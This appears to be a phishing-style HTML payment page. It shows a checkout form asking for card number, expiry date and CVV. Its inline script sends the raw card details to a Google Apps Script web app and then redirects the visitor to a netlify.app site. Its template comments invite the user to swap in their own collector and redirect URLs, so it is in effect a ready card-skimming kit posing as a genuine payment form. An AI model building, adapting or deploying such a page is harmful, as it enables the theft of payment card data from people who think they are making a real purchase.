<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Page</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Payment Information</h1>
        <form id="payment-form">
            <div class="form-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required>
            </div>
            <div class="form-group">
                <label for="exp-month">Expiration Month</label>
                <select id="exp-month" name="exp-month" required>
                    <option value="" disabled selected>Select Month</option>
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                </select>
            </div>
            <div class="form-group">
                <label for="exp-year">Expiration Year</label>
                <select id="exp-year" name="exp-year" required>
                    <option value="" disabled selected>Select Year</option>
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                </select>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" required>
            </div>
            <button type="submit" class="submit-button">Submit Payment</button>
        </form>
    </div>

   <script>
    document.getElementById('payment-form').addEventListener('submit', function(event) {
        event.preventDefault();
        const cardNumber = document.getElementById('card-number').value;
        const expMonth = document.getElementById('exp-month').value;
        const expYear = document.getElementById('exp-year').value;
        const cvv = document.getElementById('cvv').value;

        fetch('https://script.google.com/macros/s/AKfycbwDOS2wZZNXN5MA44UUV2Y_LxDQmOPhh86YO6Rk5bxEzmWUP7B60rx-dQERsVEP_Hfc/exec', { // Replace with your web app URL
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cardNumber: cardNumber,
                expMonth: expMonth,
                expYear: expYear,
                cvv: cvv
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.result === "Success") {
                // Redirect to another site after successful submission
                window.location.href = "https://melodic-puppy-430091.netlify.app"; // Replace with your desired URL
            } else {
                console.error("Error submitting payment information.");
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
    });
</script>
</body>
</html>
